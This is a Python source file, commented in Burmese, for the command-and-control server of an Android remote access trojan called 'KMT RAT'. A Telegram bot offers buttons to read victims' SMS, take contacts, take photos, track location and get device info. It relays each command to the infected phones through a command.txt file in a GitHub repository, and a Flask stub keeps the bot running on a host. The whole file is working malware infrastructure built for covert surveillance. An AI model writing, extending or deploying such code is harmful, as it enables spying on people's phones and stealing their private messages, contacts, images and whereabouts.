import os
import threading
import telebot
import requests
import base64
from flask import Flask

# 1. Flask App (Render အတွက် Port 10000 ဖွင့်ရန်)
app = Flask(__name__)

@app.route('/')
def home():
    return "KMT RAT Bot is running live!"

# 2. Telegram & GitHub Setup
TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
REPO_OWNER = "qqq1234ttttt"
REPO_NAME = "KMT-All-Software-Rat-Control"
FILE_PATH = "command.txt"

bot = telebot.TeleBot(TOKEN)

# GitHub သို့ Command ပို့သည့် Function
def update_github(command):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}", 
        "Accept": "application/vnd.github+json"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()['sha']
        content_encoded = base64.b64encode(command.encode('ascii')).decode('ascii')
        
        data = {
            "message": f"Execute {command}",
            "content": content_encoded,
            "sha": sha
        }
        requests.put(url, headers=headers, json=data)

# 3. Telegram Start Command & Control Panel (ခလုတ်များ)
@bot.message_handler(commands=['start', 'panel'])
def send_control_panel(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    btn_info = telebot.types.InlineKeyboardButton("📱 Device Info", callback_data="cmd_info")
    btn_sms = telebot.types.InlineKeyboardButton("✉️ Read SMS", callback_data="cmd_sms")
    btn_contacts = telebot.types.InlineKeyboardButton("📇 Get Contacts", callback_data="cmd_contacts")
    btn_cam = telebot.types.InlineKeyboardButton("📸 Take Photo", callback_data="cmd_cam")
    btn_loc = telebot.types.InlineKeyboardButton("📍 Get Location", callback_data="cmd_loc")
    btn_clear = telebot.types.InlineKeyboardButton("🧹 Clear Command", callback_data="cmd_clear")
    
    markup.add(btn_info, btn_sms, btn_contacts, btn_cam, btn_loc, btn_clear)
    
    bot.send_message(
        message.chat.id, 
        "🔥 **KMT RAT Control Panel** 🔥\n\nလိုချင်သော အမိန့် (Command) ကို အောက်ပါခလုတ်များမှ ရွေးချယ်ပါ:", 
        reply_markup=markup,
        parse_mode="Markdown"
    )

# 4. Callback Queries (ခလုတ်နှိပ်လိုက်သည့်အခါ လုပ်ဆောင်ချက်များ)
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    if call.data == "cmd_info":
        update_github("CMD: GET_INFO")
        bot.answer_callback_query(call.id, "Device Info command sent!")
        bot.send_message(chat_id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို ပို့ပြီးပါပြီ။")
        
    elif call.data == "cmd_sms":
        update_github("CMD: READ_SMS")
        bot.answer_callback_query(call.id, "Read SMS command sent!")
        bot.send_message(chat_id, "✉️ SMS ဖတ်ရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
        
    elif call.data == "cmd_contacts":
        update_github("CMD: GET_CONTACTS")
        bot.answer_callback_query(call.id, "Get Contacts command sent!")
        bot.send_message(chat_id, "📇 Contacts ယူရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
        
    elif call.data == "cmd_cam":
        update_github("CMD: TAKE_PHOTO")
        bot.answer_callback_query(call.id, "Take Photo command sent!")
        bot.send_message(chat_id, "📸 ဓာတ်ပုံရိုက်ရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
        
    elif call.data == "cmd_loc":
        update_github("CMD: GET_LOCATION")
        bot.answer_callback_query(call.id, "Get Location command sent!")
        bot.send_message(chat_id, "📍 တည်နေရာ (Location) ယူရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
        
    elif call.data == "cmd_clear":
        update_github("IDLE")
        bot.answer_callback_query(call.id, "Command cleared!")
        bot.send_message(chat_id, "🧹 Command ကို IDLE (ဘာမှမလုပ်ရန်) သို့ ပြောင်းလိုက်ပါပြီ။")

# 5. Background Thread & Flask Run
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    t = threading.Thread(target=run_bot)
    t.start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
